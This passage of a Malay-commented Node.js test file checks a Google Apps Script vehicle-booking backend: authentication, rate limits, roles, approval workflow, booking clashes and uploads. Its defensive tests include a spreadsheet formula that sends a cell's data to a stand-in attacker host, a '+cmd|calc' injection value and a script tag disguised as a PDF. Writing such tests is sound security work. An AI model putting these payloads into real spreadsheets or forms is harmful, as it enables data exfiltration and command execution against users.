// Ujian backend Apps Script menggunakan tiruan API Google. Guna: node test/uji_backend.mjs
import { bina } from './gas-mock.mjs';

const keputusan = [];
const semak = (nama, syarat, butiran = '') => keputusan.push({ nama, lulus: !!syarat, butiran: String(butiran) });
const jangkaRalat = (nama, jawapan, teks) =>
  semak(nama, jawapan.ok === false && (!teks || jawapan.error.includes(teks)), jawapan.ok ? 'berjaya (tidak dijangka)' : jawapan.error);
const jangkaOk = (nama, jawapan) => semak(nama, jawapan.ok === true, jawapan.ok ? '' : jawapan.error);

const g = bina();
g.sifat.set('ADMIN_EMAIL', 'admin@org.my');
g.sifat.set('APP_URL', 'https://contoh.github.io/repo/');
g.jalan('setup()');
const p = g.panggil;

// Bantu: daftar + sahkan + log masuk, kembalikan token
const KATA = 'KataLaluan123';
function daftarPenuh(emel, nama) {
  const awal = g.outbox.length;
  const d = p('daftar', { emel, nama, kata_laluan: KATA, persetujuan: true });
  if (!d.ok) throw new Error('daftar gagal: ' + d.error);
  const kod = /<b[^>]*>(\d{6})<\/b>/.exec(g.outbox[awal].htmlBody)[1];
  const s = p('sahkan_emel', { emel, kod });
  if (!s.ok) throw new Error('sahkan gagal: ' + s.error);
  const l = p('log_masuk', { emel, kata_laluan: KATA });
  if (!l.ok) throw new Error('login gagal: ' + l.error);
  return l.data;
}
const sesiDari = (emel) => p('log_masuk', { emel, kata_laluan: KATA }).data.token;
const tetapPeranan = (adminToken, emel, peranan) => {
  const u = p('admin_pengguna', {}, adminToken).data.find((x) => x.emel === emel);
  return p('admin_tetapkan_peranan', { id: u.id, peranan, aktif: true }, adminToken);
};

// ------------------------------------------------------------- setup
semak('setup cipta semua lembaran', ['Pengguna', 'Kenderaan', 'Pemandu', 'Permohonan', 'Tempahan', 'Keputusan', 'Versi', 'Dokumen', 'Audit', 'Tetapan'].every((n) => g.lembaran.has(n)));
semak('setup semai 3 kenderaan dan 3 pemandu', g.jalan('baca("Kenderaan").length') === 3 && g.jalan('baca("Pemandu").length') === 3);
semak('setup pasang pencetus berjadual', g.picu.includes('tutupPermohonanLuput') && g.picu.includes('bersihkanRekodLama'));
semak('setup jana PEPPER', (g.sifat.get('PEPPER') || '').length > 40);
semak('setup lindungi setiap lembaran dan buang editor lain', [...g.lembaran.values()].every((s) => s.perlindungan.length === 1 && s.perlindungan[0].editors.join() === 'pemilik@x.my'));
semak('setup jalan dua kali tidak gandakan data', (() => { g.jalan('setup()'); return g.jalan('baca("Kenderaan").length') === 3 && g.picu.length === 2; })());
semak('semua lajur ditandakan format teks', [...g.lembaran.values()].every((s) => s.semuaSel().filter((c) => c.fmt !== '@' && c.v !== '').length === 0));

// ------------------------------------------------------------- GET
const get = JSON.parse(g.jalan('doGet()').getContent());
semak('doGet tidak mendedahkan data', JSON.stringify(get) === '{"ok":true,"sistem":"Tempahan Kenderaan"}');

// ------------------------------------------------------------- pendaftaran
jangkaRalat('daftar tanpa persetujuan ditolak', p('daftar', { emel: 'a@org.my', nama: 'Ali', kata_laluan: KATA }), 'notis privasi');
jangkaRalat('kata laluan pendek ditolak', p('daftar', { emel: 'a@org.my', nama: 'Ali', kata_laluan: 'pendek', persetujuan: true }), '8 aksara');
jangkaRalat('emel tidak sah ditolak', p('daftar', { emel: 'bukan-emel', nama: 'Ali', kata_laluan: KATA, persetujuan: true }), 'Emel tidak sah');

const admin = daftarPenuh('admin@org.my', 'Dina Admin');
semak('emel ADMIN_EMAIL jadi admin', admin.profil.peranan === 'admin');
const hash = g.jalan('baca("Pengguna")[0].Hash');
semak('kata laluan tidak disimpan plaintext di mana-mana lembaran', ![...g.lembaran.values()].some((s) => s.semuaSel().some((c) => String(c.v).includes(KATA))));
semak('hash 64 aksara hex dan salt unik per pengguna', /^[0-9a-f]{64}$/.test(hash));
const ali = daftarPenuh('ali@org.my', 'Ali');
const bakar = daftarPenuh('bakar@org.my', 'Bakar');
const chong = daftarPenuh('chong@org.my', 'Chong');
const emi = daftarPenuh('emi@org.my', 'Emi');
semak('salt berbeza antara pengguna', g.jalan('new Set(baca("Pengguna").map(u=>u.Salt)).size') === 5);
semak('hash berbeza walaupun kata laluan sama', g.jalan('new Set(baca("Pengguna").map(u=>u.Hash)).size') === 5);
semak('pengguna biasa jadi pemohon', ali.profil.peranan === 'pemohon');
tetapPeranan(admin.token, 'bakar@org.my', 'penyemak');
tetapPeranan(admin.token, 'chong@org.my', 'pelulus');
// token sedia ada mesti nampak peranan baharu serta-merta (peranan dibaca semula dari Sheet)
semak('peranan baharu berkuat kuasa pada token sedia ada', p('senarai_tugasan', {}, bakar.token).ok);

// pengesahan emel
{
  const awal = g.outbox.length;
  p('daftar', { emel: 'baru@org.my', nama: 'Baru', kata_laluan: KATA, persetujuan: true });
  jangkaRalat('akaun belum disahkan tidak boleh login', p('log_masuk', { emel: 'baru@org.my', kata_laluan: KATA }), 'belum disahkan');
  jangkaRalat('kod salah ditolak', p('sahkan_emel', { emel: 'baru@org.my', kod: '000000' }), 'tidak betul');
  const kod = /<b[^>]*>(\d{6})<\/b>/.exec(g.outbox[awal].htmlBody)[1];
  jangkaOk('kod betul diterima', p('sahkan_emel', { emel: 'baru@org.my', kod }));
  jangkaRalat('kod tidak boleh guna dua kali', p('sahkan_emel', { emel: 'baru@org.my', kod }));
}
{
  const awal = g.outbox.length;
  const j = p('daftar', { emel: 'ali@org.my', nama: 'Penyamar', kata_laluan: 'LainLain123', persetujuan: true });
  semak('daftar emel sedia ada: jawapan sama, tiada emel, tiada tulis ganti', j.ok && g.outbox.length === awal && g.jalan('baca("Pengguna").filter(u=>u.Emel==="ali@org.my")[0].Nama') === 'Ali');
}
{
  const e = 'brute@org.my';
  const awal = g.outbox.length;
  p('daftar', { emel: e, nama: 'Brute', kata_laluan: KATA, persetujuan: true });
  let tamat = null;
  for (let i = 0; i < 6; i++) tamat = p('sahkan_emel', { emel: e, kod: '111111' });
  jangkaRalat('5 kod salah memadam kod (tidak boleh brute-force)', tamat, 'Minta kod baharu');
  const kod = /<b[^>]*>(\d{6})<\/b>/.exec(g.outbox[awal].htmlBody)[1];
  jangkaRalat('kod betul selepas dihadkan tetap ditolak', p('sahkan_emel', { emel: e, kod }));
}

// ------------------------------------------------------------- login & sesi
jangkaRalat('login salah: mesej generik', p('log_masuk', { emel: 'ali@org.my', kata_laluan: 'salah-salah' }), 'Emel atau kata laluan tidak betul');
jangkaRalat('login emel tiada: mesej sama', p('log_masuk', { emel: 'tiada@org.my', kata_laluan: 'salah-salah' }), 'Emel atau kata laluan tidak betul');
{
  let akhir;
  for (let i = 0; i < 10; i++) akhir = p('log_masuk', { emel: 'emi@org.my', kata_laluan: 'salah-salah' });
  jangkaRalat('had login 8 percubaan / 5 minit', akhir, 'Terlalu banyak');
  jangkaRalat('login betul turut disekat semasa had aktif', p('log_masuk', { emel: 'emi@org.my', kata_laluan: KATA }), 'Terlalu banyak');
  g.cache.forEach((_, k) => { if (k.startsWith('kadar_')) g.cache.delete(k); });   // simulasi tamat 5 minit
}
jangkaRalat('tiada token ditolak', p('senarai_saya', {}), 'Sesi tamat');
jangkaRalat('token rekaan ditolak', p('senarai_saya', {}, 'abc'), 'Sesi tamat');
jangkaRalat('token bukan string ditolak', p('senarai_saya', {}, { x: 1 }), 'Sesi tamat');
semak('token panjang 64 aksara hex rawak', /^[0-9a-f]{64}$/.test(ali.token) && ali.token !== bakar.token);
{
  const sementara = sesiDari('ali@org.my');
  jangkaOk('token sah berfungsi', p('senarai_saya', {}, sementara));
  p('log_keluar', {}, sementara);
  jangkaRalat('token dibatalkan di server selepas log keluar', p('senarai_saya', {}, sementara), 'Sesi tamat');
}
jangkaRalat('tindakan tidak dikenali ditolak', p('padam_semua', {}, ali.token), 'tidak dikenali');
jangkaRalat('tindakan "constructor" ditolak', p('constructor', {}, ali.token), 'tidak dikenali');
jangkaRalat('tindakan "__proto__" ditolak', p('__proto__', {}, ali.token), 'tidak dikenali');
jangkaRalat('JSON rosak ditolak', g.mentah('{bukan json'), 'tidak sah');
jangkaRalat('badan terlalu besar ditolak', g.mentah('x'.repeat(4600000)), 'tidak sah');
semak('ralat dalaman tidak bocorkan butiran', (() => {
  const asal = g.jalan('baca');
  g.jalan('globalThis.__asal = baca; baca = function(){ throw new Error("rahsia-dalaman 123"); }');
  const j = p('senarai_saya', {}, ali.token);
  g.jalan('baca = globalThis.__asal');
  return j.ok === false && !j.error.includes('rahsia') && j.kod === 'DALAMAN';
})());

// ------------------------------------------------------------- kawalan peranan (server)
for (const [tindakan, token, nama] of [
  ['admin_pengguna', ali.token, 'pemohon'], ['admin_audit', bakar.token, 'penyemak'], ['admin_simpan_tetapan', chong.token, 'pelulus'],
  ['admin_tetapkan_peranan', ali.token, 'pemohon'], ['admin_simpan_kenderaan', emi.token, 'pemohon'],
]) jangkaRalat(`${tindakan} ditolak untuk ${nama}`, p(tindakan, { id: 'x', peranan: 'admin', aktif: true }, token), 'tiada kebenaran');
jangkaRalat('pemohon tidak boleh ambil semakan', p('ambil_semakan', { id: 'x' }, ali.token), 'tiada kebenaran');
jangkaRalat('pemohon tidak boleh lulus', p('lulus', { id: 'x' }, ali.token), 'tiada kebenaran');
jangkaRalat('penyemak tidak boleh lulus', p('lulus', { id: 'x' }, bakar.token), 'tiada kebenaran');
jangkaRalat('pelulus tidak boleh ambil semakan', p('ambil_semakan', { id: 'x' }, chong.token), 'tiada kebenaran');
jangkaRalat('pemohon tidak boleh lihat senarai tugasan', p('senarai_tugasan', {}, ali.token), 'tiada kebenaran');

// ------------------------------------------------------------- aliran permohonan
const hari = (n, jam = 0) => new Date(Date.now() + n * 86400000 + jam * 3600000).toISOString();
const draf = (token, o = {}) => p('simpan_permohonan', {
  tujuan: 'Lawatan kerja ke Ipoh', destinasi: 'Ipoh', bil_penumpang: 8,
  tarikh_mula: hari(10), tarikh_tamat: hari(10, 6), jenis_diminta: 'van', perlu_pemandu: false, ...o,
}, token);

const r1 = draf(ali.token).data.id;
semak('draf tiada no rujukan', p('butiran', { id: r1 }, ali.token).data.permohonan.no_rujukan === null);
jangkaRalat('draf peribadi: penyemak tidak nampak', p('butiran', { id: r1 }, bakar.token), 'tidak ditemui');
const rujukan1 = p('hantar_permohonan', { id: r1 }, ali.token).data.no_rujukan;
semak('no rujukan dijana format VB-TAHUN-0001', /^VB-\d{4}-0001$/.test(rujukan1), rujukan1);
jangkaRalat('hantar dua kali ditolak', p('hantar_permohonan', { id: r1 }, ali.token), 'status semasa');
jangkaRalat('pemohon lain tidak nampak', p('butiran', { id: r1 }, emi.token), 'tidak ditemui');
jangkaOk('penyemak nampak selepas dihantar', p('butiran', { id: r1 }, bakar.token));
jangkaRalat('pemohon lain tidak boleh edit', p('simpan_permohonan', { id: r1, tujuan: 'Ubah suai orang', destinasi: 'Ipoh', bil_penumpang: 1, tarikh_mula: hari(10), tarikh_tamat: hari(10, 2) }, emi.token), 'tidak ditemui');
jangkaRalat('pemohon tak boleh edit selepas dihantar', p('simpan_permohonan', { id: r1, tujuan: 'Ubah suai lagi', destinasi: 'Ipoh', bil_penumpang: 1, tarikh_mula: hari(10), tarikh_tamat: hari(10, 2) }, ali.token), 'status semasa');
semak('emel diterima dihantar kepada pemohon, tugasan kepada penyemak', g.outbox.some((m) => m.to === 'ali@org.my' && m.subject.includes('diterima')) && g.outbox.some((m) => m.to === 'bakar@org.my' && m.subject.includes('Tugasan semakan')));
semak('emel pemohon tidak dihantar kepada pelulus pada peringkat semakan', !g.outbox.some((m) => m.to.includes('chong@org.my') && m.subject.includes(rujukan1)));
semak('pautan emel guna APP_URL', g.outbox.some((m) => m.htmlBody.includes('https://contoh.github.io/repo/#/permohonan/' + r1)));
semak('senarai tugasan penyemak mengandungi r1', p('senarai_tugasan', {}, bakar.token).data.some((r) => r.id === r1));
jangkaRalat('pelulus tidak nampak tugasan semakan', p('ambil_semakan', { id: r1 }, chong.token), 'tiada kebenaran');

jangkaOk('penyemak ambil semakan', p('ambil_semakan', { id: r1 }, bakar.token));
jangkaRalat('pulang tanpa catatan ditolak', p('pulangkan', { id: r1, catatan: 'ab' }, bakar.token), 'Catatan');
jangkaOk('pulangkan dengan catatan', p('pulangkan', { id: r1, catatan: 'Sila lampirkan surat tugasan' }, bakar.token));
semak('emel dipulangkan mengandungi catatan', g.outbox.some((m) => m.to === 'ali@org.my' && m.htmlBody.includes('Sila lampirkan surat tugasan')));
jangkaOk('pemohon betulkan', p('simpan_permohonan', { id: r1, tujuan: 'Lawatan kerja ke Ipoh (dibetulkan)', destinasi: 'Ipoh', bil_penumpang: 8, tarikh_mula: hari(10), tarikh_tamat: hari(10, 6), jenis_diminta: 'van' }, ali.token));
const rujukan1b = p('hantar_permohonan', { id: r1 }, ali.token).data.no_rujukan;
semak('no rujukan kekal selepas hantar semula', rujukan1b === rujukan1);
semak('versi disimpan setiap penghantaran', g.jalan('baca("Versi").filter(v=>v.PermohonanID==="' + r1 + '").length') === 2);
semak('emel diterima tidak dihantar dua kali', g.outbox.filter((m) => m.subject.includes('diterima') && m.subject.includes(rujukan1)).length === 1);

p('ambil_semakan', { id: r1 }, bakar.token);
const kosong = p('cari_kosong', { mula: hari(10), tamat: hari(10, 6) }, bakar.token).data;
semak('cari kosong: 3 kenderaan, 3 pemandu', kosong.kenderaan.length === 3 && kosong.pemandu.length === 3);
const idV = (jenis) => kosong.kenderaan.find((v) => v.jenis === jenis).id;
const idD = (nama) => kosong.pemandu.find((d) => d.nama === nama).id;
jangkaRalat('kapasiti tidak cukup', p('hantar_kelulusan', { id: r1, vehicle_id: idV('hilux') }, bakar.token), 'Kapasiti');
jangkaRalat('bas wajib pemandu', p('hantar_kelulusan', { id: r1, vehicle_id: idV('bas') }, bakar.token), 'Pemandu mesti');
jangkaRalat('kenderaan rekaan ditolak', p('hantar_kelulusan', { id: r1, vehicle_id: 'rekaan' }, bakar.token), 'kenderaan');
jangkaRalat('penyemak lain tidak boleh hantar kelulusan', (() => { return p('hantar_kelulusan', { id: r1, vehicle_id: idV('van') }, admin.token); })(), 'tiada kebenaran');
jangkaOk('hantar kelulusan', p('hantar_kelulusan', { id: r1, vehicle_id: idV('van'), catatan: 'Lengkap' }, bakar.token));
semak('emel tugasan pelulus', g.outbox.some((m) => m.to === 'chong@org.my' && m.subject.includes('Menunggu kelulusan')));

jangkaRalat('tolak tanpa justifikasi', p('tolak', { id: r1, sebab: '  ' }, chong.token), 'Justifikasi');
jangkaRalat('tolak justifikasi pendek', p('tolak', { id: r1, sebab: 'tak' }, chong.token), 'Justifikasi');
jangkaRalat('penyemak tak boleh lulus', p('lulus', { id: r1 }, bakar.token), 'tiada kebenaran');
jangkaOk('pelulus luluskan', p('lulus', { id: r1 }, chong.token));
semak('tempahan dikunci', g.jalan('baca("Tempahan").length') === 1);
jangkaRalat('lulus dua kali ditolak', p('lulus', { id: r1 }, chong.token), 'tidak menunggu');
semak('emel keputusan lulus', g.outbox.some((m) => m.to === 'ali@org.my' && m.subject.includes('diluluskan')));

// pemisahan tugas: pemohon = penyemak atau pelulus
{
  tetapPeranan(admin.token, 'emi@org.my', 'penyemak');
  const rEmi = draf(emi.token, { tujuan: 'Penyemak minta sendiri' }).data.id;
  p('hantar_permohonan', { id: rEmi }, emi.token);
  jangkaRalat('penyemak tak boleh semak permohonan sendiri', p('ambil_semakan', { id: rEmi }, emi.token), 'sendiri');
  semak('permohonan sendiri tidak muncul dalam tugasan', !p('senarai_tugasan', {}, emi.token).data.some((r) => r.id === rEmi));
  tetapPeranan(admin.token, 'emi@org.my', 'pemohon');
  p('batal_permohonan', { id: rEmi }, emi.token);
}

// tempahan bertindih
const r2 = draf(emi.token, { tujuan: 'Hantar barang', destinasi: 'Shah Alam', bil_penumpang: 3, tarikh_mula: hari(10, 1), tarikh_tamat: hari(10, 3) }).data.id;
p('hantar_permohonan', { id: r2 }, emi.token);
p('ambil_semakan', { id: r2 }, bakar.token);
jangkaRalat('van bertindih ditolak semasa tugasan', p('hantar_kelulusan', { id: r2, vehicle_id: idV('van') }, bakar.token), 'sudah ditempah');
jangkaOk('hilux tidak bertindih diterima', p('hantar_kelulusan', { id: r2, vehicle_id: idV('hilux') }, bakar.token));
semak('cari kosong tidak sertakan van yang ditempah', !p('cari_kosong', { mula: hari(10, 1), tamat: hari(10, 3) }, ali.token).data.kenderaan.some((v) => v.jenis === 'van'));
semak('cari kosong: tempahan bersebelahan (tamat = mula) tidak bertindih', p('cari_kosong', { mula: hari(10, 6), tamat: hari(10, 8) }, ali.token).data.kenderaan.some((v) => v.jenis === 'van'));

// perlumbaan: dua permohonan bas + pemandu yang sama dihantar kelulusan, pelulus lulus kedua-duanya
const r3 = draf(ali.token, { tujuan: 'Program komuniti', destinasi: 'Klang', bil_penumpang: 10, tarikh_mula: hari(20), tarikh_tamat: hari(20, 5), jenis_diminta: 'bas', perlu_pemandu: true }).data.id;
const r4 = draf(emi.token, { tujuan: 'Program belia', destinasi: 'Klang', bil_penumpang: 10, tarikh_mula: hari(20, 1), tarikh_tamat: hari(20, 4), jenis_diminta: 'bas', perlu_pemandu: true }).data.id;
[[r3, ali.token], [r4, emi.token]].forEach(([id, t]) => { p('hantar_permohonan', { id }, t); p('ambil_semakan', { id }, bakar.token); });
jangkaOk('r3 bas + Farid', p('hantar_kelulusan', { id: r3, vehicle_id: idV('bas'), driver_id: idD('Farid') }, bakar.token));
jangkaOk('r4 bas + Azerul (belum dikunci, penyemak tak nampak konflik)', p('hantar_kelulusan', { id: r4, vehicle_id: idV('bas'), driver_id: idD('Azerul') }, bakar.token));
jangkaOk('lulus r3', p('lulus', { id: r3 }, chong.token));
jangkaRalat('lulus r4 gagal kerana bas bertindih', p('lulus', { id: r4 }, chong.token), 'telah ditempah');
semak('r4 kekal menunggu kelulusan', p('butiran', { id: r4 }, chong.token).data.permohonan.status === 'menunggu_kelulusan');
semak('hanya 1 tempahan bas', g.jalan('baca("Tempahan").filter(t=>t.KenderaanID==="' + idV('bas') + '").length') === 1);
jangkaOk('hantar balik kepada penyemak', p('hantar_balik', { id: r4, catatan: 'Bas sudah ditempah, tukar kenderaan' }, chong.token));
jangkaRalat('r4 pemandu bertindih dengan r3 ditolak (Farid)', p('hantar_kelulusan', { id: r4, vehicle_id: idV('van'), driver_id: idD('Farid') }, bakar.token), 'Pemandu tersebut');
jangkaOk('r4 van + Azerul', p('hantar_kelulusan', { id: r4, vehicle_id: idV('van'), driver_id: idD('Azerul') }, bakar.token));
jangkaOk('tolak dengan justifikasi', p('tolak', { id: r4, sebab: 'Tidak memenuhi syarat penganjuran' }, chong.token));
{
  const bt = p('butiran', { id: r4 }, emi.token).data;
  semak('sebab tolak disimpan dan dipaparkan kepada pemohon', bt.permohonan.sebab_tolak === 'Tidak memenuhi syarat penganjuran');
  semak('emel tolak mengandungi sebab', g.outbox.some((m) => m.to === 'emi@org.my' && m.htmlBody.includes('Tidak memenuhi syarat')));
  semak('pemohon tidak nampak nama penyemak/pelulus dan penyemak_id', bt.permohonan.penyemak_id === null && bt.keputusan.filter((k) => k.oleh !== 'Pegawai' && k.oleh !== 'Emi').length === 0);
  const btStaf = p('butiran', { id: r4 }, bakar.token).data;
  semak('staf nampak nama pegawai dan pemohon', btStaf.keputusan.some((k) => k.oleh === 'Chong') && btStaf.permohonan.pemohon.nama === 'Emi');
}

// had 60 hari, tarikh lepas
{
  const jauh = draf(ali.token, { tarikh_mula: hari(61), tarikh_tamat: hari(61, 2) }).data.id;
  jangkaRalat('lebih 60 hari ditolak', p('hantar_permohonan', { id: jauh }, ali.token), '60 hari');
  const lepas = draf(ali.token, { tarikh_mula: hari(-1), tarikh_tamat: hari(0, 2) }).data.id;
  jangkaRalat('tarikh lepas ditolak', p('hantar_permohonan', { id: lepas }, ali.token), 'masa hadapan');
  jangkaRalat('tamat sebelum mula ditolak', draf(ali.token, { tarikh_mula: hari(5, 5), tarikh_tamat: hari(5) }), 'selepas tarikh mula');
  jangkaRalat('bilangan penumpang 0 ditolak', draf(ali.token, { bil_penumpang: 0 }), 'Bilangan penumpang');
  jangkaRalat('bilangan penumpang pecahan ditolak', draf(ali.token, { bil_penumpang: 2.5 }), 'Bilangan penumpang');
  jangkaRalat('jenis kenderaan tidak sah ditolak', draf(ali.token, { jenis_diminta: 'kereta' }), 'Jenis kenderaan');
  jangkaRalat('tujuan terlalu panjang ditolak', draf(ali.token, { tujuan: 'x'.repeat(301) }), 'terlalu panjang');
  jangkaRalat('tarikh tidak sah ditolak', draf(ali.token, { tarikh_mula: 'esok' }), 'tidak sah');
}

// had pemulangan
{
  const r = draf(ali.token, { tujuan: 'Uji had pulang' }).data.id;
  p('hantar_permohonan', { id: r }, ali.token);
  let akhir;
  for (let i = 0; i < 3; i++) {
    p('ambil_semakan', { id: r }, bakar.token);
    akhir = p('pulangkan', { id: r, catatan: 'Pusingan ' + i + ' pembetulan' }, bakar.token);
    p('hantar_permohonan', { id: r }, ali.token);
  }
  p('ambil_semakan', { id: r }, bakar.token);
  jangkaRalat('had pemulangan 3 kali', p('pulangkan', { id: r, catatan: 'Pusingan keempat' }, bakar.token), 'Had pemulangan');
  p('batal_permohonan', { id: r }, ali.token);
}

// tamat tempoh pembetulan
{
  const r = draf(ali.token, { tujuan: 'Uji tamat tempoh' }).data.id;
  p('hantar_permohonan', { id: r }, ali.token);
  p('ambil_semakan', { id: r }, bakar.token);
  p('pulangkan', { id: r, catatan: 'Betulkan tarikh perjalanan' }, bakar.token);
  const lama = new Date(Date.now() - 3600000).toISOString();
  g.jalan('(function(){ const r = baca("Permohonan").filter(x=>x.ID==="' + r + '")[0]; kemas("Permohonan", r.ID, {AkhirPembetulan:"' + lama + '"}); })()');
  jangkaRalat('hantar selepas tempoh pembetulan ditolak', p('hantar_permohonan', { id: r }, ali.token), 'Tempoh pembetulan');
  const n = g.jalan('tutupPermohonanLuput()');
  semak('tutup luput menukar status tamat_tempoh', n === 1 && p('butiran', { id: r }, ali.token).data.permohonan.status === 'tamat_tempoh');
  semak('emel tamat tempoh', g.outbox.some((m) => m.to === 'ali@org.my' && m.subject.includes('tamat tempoh')));
}

// pembatalan
{
  const dekat = draf(ali.token, { tujuan: 'Perjalanan dekat', tarikh_mula: hari(0, 5), tarikh_tamat: hari(0, 9), jenis_diminta: 'bas', perlu_pemandu: true, bil_penumpang: 5 }).data.id;
  p('hantar_permohonan', { id: dekat }, ali.token);
  p('ambil_semakan', { id: dekat }, bakar.token);
  p('hantar_kelulusan', { id: dekat, vehicle_id: idV('bas'), driver_id: idD('Luqman') }, bakar.token);
  p('lulus', { id: dekat }, chong.token);
  jangkaRalat('batal kurang 24 jam sebelum ditolak untuk pemohon', p('batal_permohonan', { id: dekat }, ali.token), '24 jam');
  jangkaRalat('pemohon lain tak boleh batal', p('batal_permohonan', { id: dekat }, emi.token), 'tidak ditemui');
  jangkaOk('admin boleh batal bila-bila masa', p('batal_permohonan', { id: dekat, sebab: 'Bas rosak' }, admin.token));
  semak('slot dilepaskan selepas batal', p('cari_kosong', { mula: hari(0, 5), tamat: hari(0, 9) }, ali.token).data.kenderaan.some((v) => v.jenis === 'bas'));
  jangkaOk('pemohon batal permohonan lulus > 24 jam', p('batal_permohonan', { id: r1, sebab: 'Program ditunda' }, ali.token));
  jangkaRalat('batal permohonan sudah dibatalkan ditolak', p('batal_permohonan', { id: r1 }, ali.token), 'status ini');
}

// ------------------------------------------------------------- formula injection
{
  const jahat = '=HYPERLINK("http://jahat.example/?d="&A1,"klik")';
  const id = draf(ali.token, { tujuan: jahat, destinasi: '+cmd|calc', jenis_diminta: '' }).data.id;
  const semuaSel = [...g.lembaran.values()].flatMap((s) => s.semuaSel());
  semak('tiada sel disimpan sebagai formula', semuaSel.every((c) => !c.formula));
  const mentah = g.jalan('baca("Permohonan").filter(x=>x.ID==="' + id + '")[0].Tujuan');
  semak('nilai berbahaya dipulihkan tepat semasa dibaca semula', mentah === jahat && p('butiran', { id }, ali.token).data.permohonan.tujuan === jahat);
  const sel = [...g.lembaran.get('Permohonan').sel_.values()].find((c) => String(c.v).includes('HYPERLINK'));
  semak('sel mentah diawali apostrof (neutral)', sel && String(sel.v).startsWith("'="), sel && sel.v);
  semak('nombor kekal teks (tidak ditukar kepada Number)', semuaSel.every((c) => c.v === '' || typeof c.v === 'string'));
  p('batal_permohonan', { id }, ali.token);
}
semak('sanitizeForSheet: = + - @', ['=1', '+1', '-1', '@a'].every((v) => g.jalan(`sanitizeForSheet(${JSON.stringify(v)})`) === "'" + v) && g.jalan('sanitizeForSheet("biasa")') === 'biasa');

// ------------------------------------------------------------- dokumen
{
  const id = draf(ali.token, { tujuan: 'Uji dokumen' }).data.id;
  const pdf = Buffer.from('%PDF-1.4\n% contoh\n').toString('base64');
  const png = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]).toString('base64');
  const jahat = Buffer.from('<script>alert(1)</script>').toString('base64');
  const d = p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'surat tugasan (1).pdf', mime: 'application/pdf', data: pdf }, ali.token);
  jangkaOk('muat naik PDF sah', d);
  jangkaOk('muat naik PNG sah', p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'gambar.png', mime: 'image/png', data: png }, ali.token));
  jangkaRalat('HTML disamar sebagai PDF ditolak (magic bytes)', p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'x.pdf', mime: 'application/pdf', data: jahat }, ali.token), 'tidak sepadan');
  jangkaRalat('jenis tidak dibenarkan ditolak', p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'x.html', mime: 'text/html', data: jahat }, ali.token), 'dibenarkan');
  jangkaRalat('lebih 3MB ditolak', p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'besar.pdf', mime: 'application/pdf', data: Buffer.concat([Buffer.from('%PDF'), Buffer.alloc(3 * 1024 * 1024)]).toString('base64') }, ali.token), '3MB');
  jangkaRalat('base64 rosak ditolak', p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'x.pdf', mime: 'application/pdf', data: '***' }, ali.token), 'tidak sah');
  jangkaRalat('pemohon lain tak boleh muat naik', p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'x.pdf', mime: 'application/pdf', data: pdf }, emi.token), 'tidak ditemui');
  semak('nama fail Drive dibersihkan', [...g.fail.values()].every((f) => /^[A-Za-z0-9._-]+$/.test(f.blob.getName())));
  jangkaRalat('draf: penyemak tak boleh muat turun', p('muat_turun_dokumen', { id: d.data.id }, bakar.token), 'tidak ditemui');
  jangkaRalat('pemohon lain tak boleh muat turun', p('muat_turun_dokumen', { id: d.data.id }, emi.token), 'tidak ditemui');
  const t = p('muat_turun_dokumen', { id: d.data.id }, ali.token);
  semak('pemilik muat turun sama seperti asal', t.ok && t.data.data === pdf && t.data.mime === 'application/pdf' && t.data.nama_fail === 'surat tugasan (1).pdf');
  p('hantar_permohonan', { id: id }, ali.token);
  jangkaOk('penyemak boleh muat turun selepas dihantar', p('muat_turun_dokumen', { id: d.data.id }, bakar.token));
  jangkaRalat('tak boleh padam dokumen selepas dihantar', p('padam_dokumen', { id: d.data.id }, ali.token), 'status ini');
  p('ambil_semakan', { id }, bakar.token);
  p('pulangkan', { id, catatan: 'Tukar dokumen sokongan' }, bakar.token);
  jangkaRalat('pemohon lain tak boleh padam', p('padam_dokumen', { id: d.data.id }, emi.token), 'tidak ditemui');
  jangkaOk('pemilik padam dokumen (dipulangkan)', p('padam_dokumen', { id: d.data.id }, ali.token));
  semak('fail Drive dibuang ke sampah', [...g.fail.values()].some((f) => f.sampah === true));
  for (let i = 0; i < 12; i++) p('muat_naik_dokumen', { permohonan_id: id, nama_fail: 'f' + i + '.pdf', mime: 'application/pdf', data: pdf }, ali.token);
  semak('had 10 dokumen setiap permohonan', g.jalan('baca("Dokumen").filter(x=>x.PermohonanID==="' + id + '").length') === 10);
  p('batal_permohonan', { id }, ali.token);
}

// ------------------------------------------------------------- kalendar
{
  const k = p('kalendar', { dari: hari(0), hingga: hari(30) }, ali.token).data;
  semak('kalendar pemohon: tiada nama pemohon/destinasi orang lain', k.tempahan.length > 0 && k.tempahan.every((t) => t.pemohon === null && t.destinasi === null));
  const ks = p('kalendar', { dari: hari(0), hingga: hari(30) }, bakar.token).data;
  semak('kalendar staf: nampak pemohon dan destinasi', ks.tempahan.some((t) => t.pemohon === 'Ali' && t.destinasi === 'Klang'));
  jangkaRalat('julat kalendar > 62 hari ditolak', p('kalendar', { dari: hari(0), hingga: hari(100) }, ali.token), 'terlalu panjang');
}

// ------------------------------------------------------------- admin
jangkaRalat('admin tidak boleh turunkan diri', p('admin_tetapkan_peranan', { id: g.jalan('baca("Pengguna")[0].ID'), peranan: 'pemohon', aktif: true }, admin.token), 'tidak boleh menurunkan');
jangkaRalat('admin tidak boleh nyahaktif diri', p('admin_tetapkan_peranan', { id: g.jalan('baca("Pengguna")[0].ID'), peranan: 'admin', aktif: false }, admin.token), 'tidak boleh menurunkan');
jangkaRalat('peranan tidak sah ditolak', p('admin_tetapkan_peranan', { id: g.jalan('baca("Pengguna")[1].ID'), peranan: 'superuser', aktif: true }, admin.token), 'Peranan tidak sah');
{
  const tokenLama = sesiDari('chong@org.my');
  const u = p('admin_pengguna', {}, admin.token).data.find((x) => x.emel === 'chong@org.my');
  p('admin_tetapkan_peranan', { id: u.id, peranan: 'pelulus', aktif: false }, admin.token);
  jangkaRalat('token pengguna dinyahaktif ditolak serta-merta', p('senarai_tugasan', {}, tokenLama), 'tidak aktif');
  jangkaRalat('pengguna dinyahaktif tak boleh log masuk', p('log_masuk', { emel: 'chong@org.my', kata_laluan: KATA }), 'tidak aktif');
